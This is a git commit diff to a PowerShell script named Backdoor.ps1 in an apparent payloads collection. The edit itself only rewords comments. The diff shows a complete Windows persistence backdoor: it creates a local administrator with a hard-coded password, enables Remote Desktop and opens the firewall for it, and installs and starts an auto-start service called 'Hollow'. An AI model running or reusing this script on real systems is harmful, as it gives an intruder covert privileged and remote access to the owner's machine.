042c2bcfaa961e865d05a470426f5458acab30a0
Tristram <47216435+gh0x0st@users.noreply.github.com>
2023-10-30 13:51:39 -0400

    Update Backdoor.ps1

--- Payloads/Backdoor.ps1
+++ Payloads/Backdoor.ps1
@@ -1,14 +1,14 @@
-# Create new administrator
+# Create new local administrator
 net user tristram Fall2023! /add
 net localgroup administrators tristram /add
 
-# Enable RDP if it's currently disabled
+# Enable terminal services if it's currently disabled
 $RDP = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections"
 if ($RDP.fDenyTSConnections -eq 1) {
     Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
     netsh advfirewall firewall set rule group='remote desktop' new enable=Yes
 } 
 
-# Create Hollow service
+# Create Hollow service and start it
 C:\Windows\System32\sc.exe create Hollow binPath="C:\Hollow.exe" start= auto
 C:\Windows\System32\sc.exe start Hollow
